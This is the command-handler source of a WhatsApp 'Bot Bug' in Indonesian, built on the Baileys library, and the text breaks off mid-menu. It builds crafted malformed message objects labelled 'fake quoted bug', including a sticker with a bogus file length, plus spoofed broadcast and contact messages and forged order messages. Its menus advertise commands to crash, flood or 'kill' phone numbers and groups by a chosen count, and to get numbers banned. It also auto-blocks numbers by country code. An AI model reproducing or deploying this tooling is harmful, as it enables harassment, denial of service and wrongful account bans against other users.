module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const anon = require('./all/menfess');
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./all/uploader')
const isMedia = /image|video|sticker|audio/.test(mime)
const { addSaldo, minSaldo, cekSaldo } = require("./all/database/deposit");
const { mediafireDl } = require('./all/database/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));

    
global.db = JSON.parse(fs.readFileSync('./all/database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}
    
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber =
JSON.parse(fs.readFileSync("./all/database/owner.json"))
const xeonverifieduser = JSON.parse(fs.readFileSync('./all/database/user.json'))

    
// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
const isUser = xeonverifieduser.includes(sender)
const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return Biiofc.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
}
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
    
//
    try {
 const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}
    
    
if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./all/database/user.json', JSON.stringify(xeonverifieduser, null, 2))
}

Biiofc.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
    
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "© fahrul", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m }) }

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Bug ᭖͜͡ᏢᎨᎯᏁᏃᏃ 😈`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/3c485ff201d9337be14ef.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
Biiofc.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
Biiofc.groupParticipantsUpdate(m.chat, [sender], 'remove')
Biiofc.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {    
case 'menu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`_*ʙᴏᴛ* *ʙᴜɪʟᴅ-ᴏᴘᴇʀᴀᴛᴇ-ᴛʀᴀɴsғᴇʀ* ᴀᴅᴀʟᴀʜ ᴘʀᴏɢʀᴀᴍ ᴋᴏᴍᴘᴜᴛᴇʀ ʏᴀɴɢ ᴅɪᴊᴀʟᴀɴᴋᴀɴ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴋʜᴜsᴜs ᴅɪʙᴜᴀᴛ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴇᴋᴇʀᴊᴀᴀɴ-ᴘᴇᴋᴇʀᴊᴀᴀɴ ᴏᴛᴏᴍᴀᴛɪs_

*— BOT INFO*

☍ ◦ *ɴᴀᴍᴀ ᴄʀᴇᴀᴛᴏʀ* : *FAHRUL*
☍ ◦ *ɴᴏᴍᴏʀ ᴄʀᴇᴀᴛᴏʀ* : *6285786539008*
☍ ◦ *ᴠᴇʀsɪ sᴄʀɪᴘᴛ* : ${global.versisc}
☍ ◦ *ᴠᴇʀsɪ ʙᴀɪʟᴇʏs* : *^${version}*
☍ ◦ *sᴇssɪᴏɴ* : *ᴍᴜʟᴛɪᴀᴜᴛʜsᴛᴀᴛᴇ*
☍ ◦ *ᴛᴀɴɢɢᴀʟ* : ${tanggal}

*— LIST MENU*

☍ ◦ .*ɢʀᴏᴜᴘᴍᴇɴᴜ* 
☍ ◦ .*ᴏᴡɴᴇʀᴍᴇɴᴜ* 
☍ ◦ .*ᴀʟʟᴍᴇɴᴜ* 
☍ ◦ .*ᴘᴜsʜᴋᴏɴᴛᴀᴋᴍᴇɴᴜ* 
☍ ◦ .*ʙᴜɢᴍᴇɴᴜ* 
☍ ◦ .*ᴘᴀɴᴇʟᴍᴇɴᴜ* 
☍ ◦ .*ʀᴇsᴇʟʟᴇʀᴍᴇɴᴜ* 
☍ ◦ .*sᴇᴀʀᴄʜᴍᴇɴᴜ*
☍ ◦ .*ᴍᴇɴғᴇsᴍᴇɴᴜ* 
☍ ◦ .*ᴄᴇᴄᴀɴᴍᴇɴᴜ* 
☍ ◦ .*ᴀsᴜᴘᴀɴᴍᴇɴᴜ* 
☍ ◦ .*ᴏᴛᴏᴍᴀᴛɪsᴍᴇɴᴜ* 

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬
`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        case 'menu': {
        var menump3 = fs.readFileSync('./all/goblok.mp3')
        await Biiofc.sendMessage(m.chat,{audio:menump3,
                                     mimetype: 'audio/mpeg',ptt:true},
                               {quoted})}
        break
        case 'allmenu':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`☍ ◦ . *ɴᴀᴍᴀ ᴄʀᴇᴀᴛᴏʀ* : *FAHRUL*
☍ ◦ . *ɴᴏᴍᴏʀ ᴄʀᴇᴀᴛᴏʀ* : *6285786539008*
☍ ◦ . *ᴠᴇʀsɪ sᴄʀɪᴘᴛ* : ${global.versisc}
☍ ◦ . *ᴠᴇʀsɪ ʙᴀɪʟᴇʏs* : *^${version}*
☍ ◦ . *sᴇssɪᴏɴ* : *ᴍᴜʟᴛɪᴀᴜᴛʜsᴛᴀᴛᴇ*
☍ ◦ . *ᴛᴀɴɢɢᴀʟ* : ${tanggal}

*— G R O U P*

☍ ◦ .ᴏᴡɴᴇʀ
☍ ◦ .ǫᴄ *ᴛᴇᴋs*
☍ ◦ .ᴛᴛs *ᴛᴇᴋs*
☍ ◦ .sᴛɪᴄᴋᴇʀ *ʀᴇᴘʟʏ ɪᴍᴀɢᴇ*
☍ ◦ .ʟɪɴᴋɢʀᴏᴜᴘ
☍ ◦ .ᴛᴏᴛᴀɢ
☍ ◦ .ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋs*
☍ ◦ .ᴀᴅᴅ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴋɪᴄᴋ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴘʀᴏᴍᴏᴛᴇ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇᴍᴏᴛᴇ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴀɴᴛɪʟɪɴᴋ *ᴏɴ/ᴏғғ*

*— O W N E R*

☍ ◦ .ᴀᴅᴅᴏᴡɴᴇʀ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇʟᴏᴡɴᴇʀ *ɴᴏᴍᴏʀ*
☍ ◦ .sᴇᴛᴘᴘʙᴏᴛ *ɪᴍᴀɢᴇ*
☍ ◦ .ʟɪsᴛᴘᴄ
☍ ◦ .ɢᴇᴛsᴇsɪ
☍ ◦ .ᴀᴅᴅᴘʀᴇᴍ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴅᴇʟᴘʀᴇᴍ *ɴᴏᴍᴏʀ*

*— P U S H K O N T A K*

☍ ◦ .ᴄᴇᴋɪᴅɢᴄ
☍ ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋ *ɪᴅɢᴄ|ᴛᴇxᴛ*
☍ ◦ .ᴘᴜsʜᴋᴏɴᴛᴀᴋᴠ𝟸 *ᴛᴇxᴛ*

*— A T T A C K  N U M B E R*

☍ ◦ .ɢᴀs *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴄʀᴀsʜ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sʜᴏᴏᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴜɢᴋᴜʏ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴜᴀʀʀ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋɪʟʟʏᴏᴜ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴏʙʟᴇᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴛʀɪᴘʟᴇᴋɪʟʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀᴠᴀɢᴇ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀɴᴛᴇᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴀɴɢᴇʀ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴇɴɪɴɢɢᴀʟ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴇᴀᴅsʜᴏᴛ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪ *ɴᴏᴍᴏʀ|ᴊᴜᴍʟᴀʜ*

*— A T T A C K  G C  V1*

☍ ◦ .ᴋɪʟʟɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴀɴᴛᴇᴛɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴄᴡᴀᴋᴡᴀᴡ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴛᴏɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴋᴜʏɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴛᴀᴄᴋɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴍᴘᴜsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴍᴘᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴀʜᴀʏᴀɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴀᴛɪʜᴀᴛɪɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴄʀᴀsʜɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴛᴜᴄᴋɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ɢᴀɴᴀsɢᴄ *ʟɪɴᴋɢᴄ|ᴊᴜᴍʟᴀʜ*

*— A T T A C K  G C  V2*

☍ ◦ .ʙᴜɢɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sʜᴏᴏᴛɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴅᴏʀʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴛᴀᴄᴋɢᴄ𝟷 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴇɴɪɴɢɢᴀʟɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴍᴀᴛɪɢᴄ𝟷 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴇʀᴀɴɢɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴏᴍɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʟᴇᴅᴀᴋᴀɴɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴀᴛᴏᴍɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʜᴀɴᴄᴜʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴜɢᴢɪʀɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .sᴛᴜᴄᴋɢᴄ𝟸 *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ʙᴀᴜɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*
☍ ◦ .ᴜʟᴛɪɢᴄ *ɪᴅɢʀᴏᴜᴘ|ᴊᴜᴍʟᴀʜ*

*— B A N N E D*

☍ ◦ .ᴄᴀʟʟ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴏᴜᴛ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴠᴇʀɪғ *ɴᴏᴍᴏʀ*
☍ ◦ .ᴋᴇɴᴏɴ    *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟷 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟸 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟹 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟺 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟻 *ɴᴏᴍᴏʀ*
☍ ◦ .ʙᴀɴɴᴇᴅᴠ𝟼 *ɴᴏᴍᴏʀ*

*— U N B A N N E D*

☍ ◦ .ᴜɴʙᴀɴɴᴇᴅᴠ𝟷 *ɴᴏᴍᴏʀ*
☍ ◦ .ᴜɴʙᴀɴɴᴇᴅᴠ𝟸 *ɴᴏᴍᴏʀ*
☍ ◦ .ᴜɴʙᴀɴɴᴇᴅᴠ𝟹 *ɴᴏᴍᴏʀ*
☍ ◦ .ᴜɴʙᴀɴɴᴇᴅᴠ𝟺 *ɴᴏᴍᴏʀ*
☍ ◦ .ᴜɴʙᴀɴɴᴇᴅᴠ𝟻 *ɴᴏᴍᴏʀ*

*— B U G  E M O J I*

☍ ◦ .🌷 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🐲 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🐉 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌵 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🎄 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌲 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌳 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌱 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .😈 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🗿 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .😎 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*

*— P A N E L*

☍ ◦ .ᴘᴀɴᴇʟ
☍ ◦ .ʟɪsᴛᴜsʀ
☍ ◦ .ᴅᴇʟᴜsʀ
☍ ◦ .ʟɪsᴛsʀᴠ
☍ ◦ .ᴅᴇʟsʀᴠ
☍ ◦ .ʀᴀᴍʟɪsᴛ
☍ ◦ .ᴀᴅᴅᴜsʀ
☍ ◦ .ᴀᴅᴅsʀᴠ
☍ ◦ .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
☍ ◦ .ʟɪsᴛᴀᴅᴍɪɴ

*— S E A R C H*

☍ ◦ .ᴀɪ *ᴛᴇxᴛ*
☍ ◦ .ᴘɪɴᴛᴇʀᴇsᴛ *ǫᴜᴇʀʏ*
☍ ◦ .ᴛɪᴋᴛᴏᴋ *ᴜʀʟ*
☍ ◦ .ᴀɪɪᴍᴀɢᴇ
☍ ◦ .ᴀɪᴛᴏᴀɴɪᴍᴇ
☍ ◦ .ᴀɪʜᴅ
☍ ◦ .ᴀɪʀᴇᴍᴏᴠᴇʙɢ
☍ ◦ .ᴛᴏᴜʀʟ *ɪᴍᴀɢᴇ*
☍ ◦ .ᴏᴘᴇɴᴀɪ *ᴛᴇxᴛ*

*— M E N F E S*

☍ ◦ .ᴍᴇɴғᴇs *@𝟼𝟸xx|ᴘᴇsᴀɴ*
☍ ◦ .ᴄᴏɴғᴇs *@𝟼𝟸xx|ᴘᴇsᴀɴ*

*— C E C A N*

☍ ◦ .ᴄʜɪɴᴀ
☍ ◦ .ʟᴏᴋᴀʟ
☍ ◦ .ᴊᴇᴘᴀɴɢ
☍ ◦ .ᴋᴏʀᴇᴀ

*— A S U P A N*

☍ ◦ .ʙᴏᴄɪʟ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .sᴀɴᴛᴜʏ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .ɢʜᴇᴀ *ᴀꜱᴜᴘᴀɴ*
☍ ◦ .ᴜᴋʜᴛʏ *ᴀꜱᴜᴘᴀɴ*

*— R E S E L L E R*

☍ ◦ .𝟷ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟸ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟹ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟺ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*
☍ ◦ .𝟻ɢʙ *ɴᴀᴍᴀ,ɴᴏᴍᴏʀ*

*— O T O M A T I S*

☍ ◦ .ʙᴜʏsᴄ
☍ ◦ .ʙᴜʏᴀᴋɴ
☍ ◦ .ʙᴜʏsʀᴠ 
☍ ◦ .ᴅᴇᴘᴏsɪᴛ
☍ ◦ .ʙᴜʏᴘʀᴇᴍ
☍ ◦ .ʙᴜʏᴏᴡɴᴇʀ

ᴘᴏᴡᴇʀᴇᴅ ʙʏ *@${owned.split("@")[0]}*`)
Biiofc.sendMessage(m.chat, {
text: owners,
contextInfo: {
externalAdReply: {
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f51e441d239f987c17f5.jpg',
sourceUrl: "https://chat.whatsapp.com/FSbrP6LWWm4A8i8uGdyDTs",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
        break
case 'bugemoji':{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
let owners = (`**— ʙᴜɢ ᴇᴍᴏᴊɪ*

☍ ◦ .🌷 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🐲 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🐉 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌵 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🎄 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌲 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌳 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🌱 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .😈 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .🗿 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*
☍ ◦ .😎 *𝟼𝟸xx|ᴊᴜᴍʟᴀʜ*

